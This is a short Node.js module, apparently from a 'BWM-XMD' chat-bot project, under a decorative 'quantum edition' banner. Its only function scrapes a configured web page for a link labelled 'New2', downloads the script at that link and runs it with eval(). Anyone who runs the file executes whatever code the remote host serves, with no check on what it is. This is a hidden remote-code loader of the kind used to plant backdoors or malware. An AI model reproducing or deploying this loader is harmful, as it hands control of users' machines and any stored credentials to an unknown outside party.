//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir SAVAGE BOYS                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const savage = require(__dirname + "/../config");

async function fetchNew2Url() {
  try {
    const response = await axios.get(savage.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("New2")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('New2 not found 😭');
    }

    console.log('New2 loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchNew2Url();
